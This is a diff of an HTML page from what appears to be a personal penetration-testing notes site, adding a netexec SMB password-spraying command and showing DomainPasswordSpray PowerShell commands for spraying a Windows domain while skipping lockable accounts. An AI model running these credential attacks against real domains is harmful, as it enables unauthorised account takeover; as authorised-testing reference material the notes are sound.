@@ -134,14 +134,15 @@
       <div><p>Related to: <a href="https://ojack69.github.io/jacks-corner/ad/active-directory.html">Active Directory</a></p>
 <h2 id="initial-attack-vectors">Initial Attack Vectors</h2>
 <h3 id="password-spraying">Password Spraying</h3>
+<p>Password spraying remotely with <code>netexec</code>:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;users<span class="w"> </span>list&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password<span class="p">|</span>password<span class="w"> </span>list&gt;<span class="w"> </span>--no-bruteforce
+</code></pre></div>
 <p>Password spraying with <a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a>:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># On the whole domain</span>
 <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
 
 <span class="c"># Generate a list of users not disabled and not potentially lockable</span>
-<span class="nb">Get-DomainUserList</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span> <span class="n">-RemoveDisabled</span> <span class="n">-RemovePotentialLockouts</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-Encoding</span> <span class="n">ascii</span> <span class="n">userlist</span><span class="p">.</span><span class="n">txt</span>
-<span class="c"># On users subset</span>
-<span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Domain</span> <span class="n">domain-name …</span></code></pre></div></div>
+<span class="nb">Get-DomainUserList</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain …</span></code></pre></div></div>
         <br>
         <a class="btn"
            href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html">
